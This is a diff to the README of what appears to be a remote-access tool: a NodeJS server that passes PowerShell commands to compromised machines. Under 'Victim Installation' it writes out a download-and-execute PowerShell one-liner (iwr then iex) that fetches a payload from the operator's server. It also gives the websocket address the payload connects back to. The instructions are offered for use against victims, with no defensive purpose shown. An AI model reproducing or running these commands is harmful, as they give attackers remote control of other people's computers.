@@ -23,7 +23,7 @@ This is a NodeJS server with the ability to pass through Powershell commands to 
  6. Goto "http://[server_ip]:3395/shell.socket" in browser & enter password
 
 ## Victim Installation
- 1. Edit "pl.ps1" and change the websocket address to your server
+ 1. Edit "pl.ps1" and change the websocket address to your server: $URL = 'ws://[server_ip]:3394'
  2. Execute the payload on the remote PC: "$pl = iwr http://[server_ip]:3395/pl -UseBasicParsing; iex $pl"
  3. Check admin panel for connection
 
